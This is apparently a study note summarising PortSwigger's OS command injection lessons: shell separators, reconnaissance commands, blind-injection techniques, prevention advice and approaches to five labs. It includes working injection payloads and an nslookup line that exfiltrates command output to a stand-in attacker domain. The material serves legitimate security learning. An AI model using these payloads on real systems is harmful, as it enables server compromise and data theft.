---
tags: [hacking, web, portswigger, command-injection]
type: vulnerability-category
source: https://portswigger.net/web-security/os-command-injection
last-verified: 2026-08-25
---

# Command injection

## Up
- [[PortSwigger]]

## What it is
OS command injection (shell injection) lets an attacker execute arbitrary operating-system commands on the server running the application — typically leading to full compromise of the app and its data, and a foothold to pivot into other systems.

## Simple example
An app runs a shell command like `stockreport.pl 381 29` from user-supplied product/store IDs. Injecting `& echo aiwefwlguh &` into a parameter yields:
```
stockreport.pl & echo aiwefwlguh & 29
```
The `&` separators split it into three commands; seeing `aiwefwlguh` in the output confirms execution.

## Injection separators (shell metacharacters)
- **Unix and Windows:** `&`  `&&`  `|`  `||`
- **Unix only:** `;`  newline (`0x0a` / `\n`)  `` `backticks` ``  `$(command)`

A separator that terminates cleanly (like wrapping in `& ... &`) often works better than a single trailing one.

## Useful reconnaissance commands

| Purpose | Linux | Windows |
|---|---|---|
| Current user | `whoami` | `whoami` |
| OS / version | `uname -a` | `ver` |
| Network config | `ifconfig` | `ipconfig /all` |
| Connections | `netstat -an` | `netstat -an` |
| Processes | `ps -ef` | `tasklist` |

## Blind OS command injection
When no output is returned, confirm and exploit via side channels:

- **Time delays** — inject a command that takes a measurable time:
  ```
  & ping -c 10 127.0.0.1 &
  ```
  A ~10-second delay confirms execution. Make it conditional to extract data one bit at a time.
- **Output redirection** — write command output to a file inside the web root, then fetch it:
  ```
  & whoami > /var/www/static/whoami.txt &
  ```
  then browse to `/whoami.txt`.
- **Out-of-band (OAST)** — trigger a DNS lookup to a Collaborator domain:
  ```
  & nslookup kgji2ohoyw.web-attacker.com &
  ```
  Exfiltrate data by embedding a command's output in the subdomain:
  ```
  & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
  ```

## Prevention
- Best: **never call out to the OS shell from application code** — use safer platform APIs instead.
- If unavoidable, validate against a strict **allow-list**, or restrict to numeric/alphanumeric input. Don't rely on escaping shell metacharacters — it's error-prone.

## Labs
5 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| OS command injection, simple case | Apprentice | Inject `& whoami &` (or similar) into a vulnerable parameter; output is reflected. | |
| Blind OS command injection with time delays | Practitioner | Inject `& ping -c 10 127.0.0.1 &` and observe the delay. | |
| Blind OS command injection with output redirection | Practitioner | `& whoami > /var/www/images/output.txt &`, then fetch the file. | |
| Blind OS command injection with out-of-band interaction | Practitioner | `& nslookup <collaborator> &` to confirm via DNS. | |
| Blind OS command injection with out-of-band data exfiltration | Practitioner | `& nslookup \`whoami\`.<collaborator> &` to exfiltrate output in DNS. | |
